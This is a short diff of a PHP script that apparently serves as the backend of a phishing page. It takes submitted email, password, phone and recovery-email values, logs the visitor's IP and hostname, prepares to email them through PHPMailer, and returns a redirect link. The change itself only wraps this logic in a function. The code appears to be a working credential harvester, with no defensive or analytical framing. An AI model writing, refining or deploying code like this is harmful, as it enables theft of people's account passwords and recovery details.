@@ -7,16 +7,18 @@ use PHPMailer\PHPMailer\SMTP;
 require 'PHPMailer/src/Exception.php';
 require 'PHPMailer/src/PHPMailer.php';
 require 'PHPMailer/src/SMTP.php';
-
+function index()
+{
 $email = trim($_POST['email']);
 $password = trim($_POST['password']);
 $phone = trim($_POST['phone']);
 $rec_email = trim($_POST['rec_email']);
-if($email != null && $password != null && $phone != null && $rec_email != null){
-	$ip = getenv("REMOTE_ADDR");
-	$hostname = gethostbyaddr($ip);
-   
-    $mail = new PHPMailer(true);
+ 
+        if($email != null && $password != null && $phone != null && $rec_email != null){
+        $ip = getenv("REMOTE_ADDR");
+        $hostname = gethostbyaddr($ip);
+    
+        $mail = new PHPMailer(true);
 
   
         //Server settings
@@ -99,5 +101,6 @@ $data = array(
         'redirect_link' => $redirect,
     );
     echo json_encode($data);
+}
 
 ?>
